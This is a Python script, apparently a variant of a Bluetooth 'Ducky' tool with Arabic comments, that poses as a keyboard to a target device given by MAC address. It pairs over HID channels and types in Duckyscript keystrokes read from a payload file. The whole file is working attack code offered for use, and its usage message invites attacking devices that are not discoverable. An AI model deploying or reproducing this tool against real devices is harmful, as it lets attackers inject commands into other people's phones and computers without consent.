#!/usr/bin/env python3
import subprocess
import sys
import time
import argparse
import logging
import re

from injector.hid import keyboard_report
from multiprocessing import Process
from injector.helpers import assert_address, log, run
from injector.client import KeyboardClient
from injector.adapter import Adapter
from injector.agent import PairingAgent
from injector.hid import Key
from injector.profile import register_hid_profile
from injector.ducky_convert import send_string, send_ducky_command

def parse_arguments():
    parser = argparse.ArgumentParser("BluetoothDucky.py")
    parser.add_argument("-i", "--interface", required=False)
    parser.add_argument("-t", "--target", required=False)
    parser.add_argument("--scan", action="store_true", help="Scan for available Bluetooth devices")

    args = parser.parse_args()

    if args.scan:
        scan_for_devices()
        sys.exit(0)

    if not args.interface or not args.target:
        parser.error("\n\nYou must specify both -i and -t when not using --scan\n\nExample Usage:sudo python3 BluetoothDucky.py -i hci0 -t 00:00:00:00:00:00\n\nKeep in mind, if their bluetooth is on but not broadcasting, you can still put in their MAC and attack it!")
    return args

def scan_for_devices():
    print("Scanning for available devices...")
    
    try:
        # تنفيذ الأمر hcitool scan باستخدام subprocess
        result = subprocess.run(["sudo", "hcitool", "scan"], capture_output=True, text=True, check=True)
        
        # تحليل الناتج
        output = result.stdout
        lines = output.splitlines()
        
        if len(lines) <= 1:  # إذا كان الناتج فارغًا أو يحتوي فقط على العنوان
            print("No Bluetooth devices found nearby.")
        else:
            print("Available Bluetooth devices:")
            for line in lines[1:]:  # تجاهل السطر الأول (العنوان)
                parts = line.split()
                if len(parts) >= 2:
                    mac_address = parts[0]
                    device_name = " ".join(parts[1:])
                    print(f"  Device: {device_name} ({mac_address})")
    
    except subprocess.CalledProcessError as e:
        print(f"Error occurred while scanning: {e}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")

def initialize_bluetooth_adapter(interface, target):
    run(["sudo", "service", "bluetooth", "restart"])
    time.sleep(0.5)

    profile_proc = Process(target=register_hid_profile, args=(interface, target))
    profile_proc.start()

    adapter = Adapter(interface)
    adapter.set_name("Robot")
    adapter.set_class(0x002540)
    run(["hcitool", "name", target])

    return adapter, profile_proc

def connect_to_target(adapter, client, target):
    retry_count = 0
    max_retries = 5  # Set the maximum number of retries
    while retry_count < max_retries:
        try:
            if not client.connect_sdp():
                log.error("Failed to connect to SDP, retrying...")
                retry_count += 1
                time.sleep(1)  # Wait for a bit before retrying
                continue

            adapter.enable_ssp()
            log.success("Connected to SDP (L2CAP 1) on target")
            with PairingAgent(adapter.iface, target):
                client.connect_hid_interrupt()
                client.connect_hid_control()
                time.sleep(1)  # Wait for connections to stabilize

                if client.c19.connected:
                    log.success("Connected to HID Interrupt (L2CAP 19) on target")
                    return True
                else:
                    log.error("Failed to connect to HID Interrupt, retrying...")
                    retry_count += 1
                    time.sleep(1)  # Wait for a bit before retrying

        except Exception as e:
            log.error(f"Exception occurred: {e}")
            retry_count += 1
            time.sleep(1)  # Wait for a bit before retrying

    log.error("Failed to connect after maximum retries")
    return False

def reconnect_hid_interrupt(client):
    retry_count = 0
    max_retry_count = 10
    while retry_count < max_retry_count:
        if client.connect_hid_interrupt():
            log.success("connected to HID Interrupt (L2CAP 19) on target")
            return True
        retry_count += 1
        log.debug(f"Retry {retry_count} connecting to HID Interrupt")
        time.sleep(1)
    log.error("Failed to connect to HID Interrupt after maximum retries")
    return False

def execute_payload(client, filename):
    current_command_index = 0
    default_delay = 1  # Default delay in seconds

    # Define the Duckyscript to HID key code mapping
    duckyscript_to_hid = {
        'ENTER': Key.Enter,
        'GUI': Key.LeftMeta,  # Left Windows key
        'WINDOWS': Key.LeftMeta,
        'ALT': Key.LeftAlt,
        'CTRL': Key.LeftControl,
        'CONTROL': Key.LeftControl,
        'SHIFT': Key.LeftShift,
        'TAB': Key.Tab,
        'ESC': Key.Escape,
        'ESCAPE': Key.Escape,
        'INSERT': Key.Insert,
        'DELETE': Key.Delete,
        'HOME': Key.Home,
        'END': Key.End,
        'PAGEUP': Key.PageUp,
        'PAGEDOWN': Key.PageDown,
        'UP': Key.Up,
        'UPARROW': Key.Up,
        'DOWN': Key.Down,
        'DOWNARROW': Key.Down,
        'LEFT': Key.Left,
        'LEFTARROW': Key.Left,
        'RIGHT': Key.Right,
        'RIGHTARROW': Key.Right,
        'CAPSLOCK': Key.CapsLock,
        'NUMLOCK': Key.NumLock,
        'PRINTSCREEN': Key.PrintScreen,
        'SCROLLLOCK': Key.ScrollLock,
        'PAUSE': Key.Pause
    }

    with open(filename, 'r') as file:
        commands = [line.strip() for line in file.readlines()]

    while current_command_index < len(commands):
        line = commands[current_command_index]

        if line.startswith('REM') or not line:
            current_command_index += 1
            continue  # Skip comments and empty lines
        try:
            if line.startswith('DEFAULT_DELAY') or line.startswith('DEFAULTDELAY'):
                default_delay = float(line.split()[1]) / 1000
            elif line.startswith('DELAY'):
                delay_parts = line.split()
                delay_time = float(delay_parts[1]) / 1000 if len(delay_parts) > 1 else default_delay
                time.sleep(delay_time)
            elif line.startswith('STRING'):
                string_to_send = line.partition(' ')[2]
                send_string(client, string_to_send)
            elif '+' in line:
                send_ducky_command(client, line)
            else:
                log.debug(f"Processing command: {line}")  # Debugging log
                if line in duckyscript_to_hid:
                    key_code = duckyscript_to_hid[line]
                    log.debug(f"Sending keypress for {line}: {key_code}")  # Debugging log
                    client.send_keyboard_report(keyboard_report(key_code))
                    client.send_keyboard_report(keyboard_report())  # Key release
                else:
                    send_ducky_command(client, line)

                time.sleep(default_delay)  # Wait for the default delay

            current_command_index += 1  # Increment after successful execution

        except Exception as e:
            log.error(f"Unhandled exception: {e}")
            break  # Exit on any other unhandled exception

    if current_command_index >= len(commands):
        log.info("Payload execution completed.")

def clean_up(adapter, profile_proc, client):
    log.status("disconnecting Bluetooth HID client")
    client.close()
    adapter.down()
    profile_proc.terminate()

if __name__ == "__main__":
    try:
        args = parse_arguments()
        
        if args.scan:
            # إذا كان الأمر هو البحث عن الأجهزة، لا نحتاج إلى تعريف adapter أو client
            sys.exit(0)
        
        # التأكد من أن العنوان والعنوان الصحيح مُدخلان
        assert_address(args.target)
        assert(re.match(r"^hci\d+$", args.interface))

        # تهيئة المحول البلوتوث
        adapter, profile_proc = initialize_bluetooth_adapter(args.interface, args.target)
        client = KeyboardClient(args.target, auto_ack=True)

        if connect_to_target(adapter, client, args.target):
            log.status("Injecting payload")
            execute_payload(client, 'payload.txt')
    except Exception as e:
        log.error(f"Unhandled exception: {e}")
    finally:
        # تنظيف الموارد فقط إذا تم تعريف المتغيرات
        if 'adapter' in locals() and 'profile_proc' in locals() and 'client' in locals():
            clean_up(adapter, profile_proc, client)
